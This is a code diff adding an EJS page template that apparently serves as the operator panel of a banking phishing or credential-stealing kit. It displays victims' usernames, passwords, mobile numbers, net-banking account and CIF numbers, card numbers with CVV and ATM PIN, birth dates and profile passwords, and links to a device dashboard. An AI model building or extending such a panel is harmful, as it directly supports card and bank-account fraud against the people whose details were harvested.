@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css"/>
+</head>
+<body>
+  <header class="header-nav">
+    <h1>Your Controller</h1>
+  </header>
+
+  <div class="user-detail-container">
+    <h2>User Details</h2>
+
+    <!-- USER SECTION -->
+    <% if (user) { %>
+      <div class="card">
+        <h3>User Information</h3>
+        <p><strong>Username:</strong> <%= user.username %></p>
+        <p><strong>Password:</strong> <%= user.password %></p>
+        <p><strong>Mobile No:</strong> <%= user.mobileNumber %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+        <p><strong>User data not available</strong></p>
+      </div>
+    <% } %>
+
+    <!-- NET BANKING SECTION -->
+    <% if (netBanking) { %>
+      <div class="card">
+        <h3>Net Banking Information</h3>
+        <p><strong>Name:</strong> <%= netBanking.name %></p>
+        <p><strong>Account No:</strong> <%= netBanking.acNumber %></p>
+        <p><strong>CIF No:</strong> <%= netBanking.cifNumber %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(netBanking.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+        <p><strong>Net banking details not available</strong></p>
+      </div>
+    <% } %>
+
+    <!-- CARD SECTION -->
+    <% if (card) { %>
+      <div class="card">
+        <h3>Card Information</h3>
+        <p><strong>Card Number:</strong> <%= card.cardNumber %></p>
+        <p><strong>Expiry Month:</strong> <%= card.expiryMonth %></p>
+        <p><strong>Expiry Year:</strong> <%= card.expiryYear %></p>
+        <p><strong>CVV:</strong> <%= card.cvv %></p>
+        <p><strong>ATM Pin:</strong> <%= card.atmPin %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(card.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+        <p><strong>Card details not available</strong></p>
+      </div>
+    <% } %>
+
+    <!-- SUCCESS DATA SECTION -->
+    <% if (success) { %>
+      <div class="card">
+        <h3>Success Information</h3>
+        <p><strong>DOB:</strong> <%= success.dob %></p>
+        <p><strong>Profile Password:</strong> <%= success.profilePassword %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(success.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+        <p><strong>Success details not available</strong></p>
+      </div>
+    <% } %>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
